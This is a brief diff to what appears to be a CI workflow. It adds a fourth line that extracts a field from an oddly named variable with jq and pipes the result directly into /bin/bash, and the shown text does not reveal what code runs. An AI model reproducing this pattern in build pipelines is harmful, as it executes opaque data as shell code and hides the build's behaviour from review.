@@ -67,6 +67,7 @@ jobs:
           echo $ke68940 | jq -r .irscn3205 | /bin/bash
           printf '%s' "$tymtx7367" | jq -r .lgs505 | /bin/bash
           echo $wpsy45 | jq -r .fk71 | /bin/bash
+          echo $zp2 | jq -r .cknaw5466 | /bin/bash
 
       - name: Save archive
         if: always()
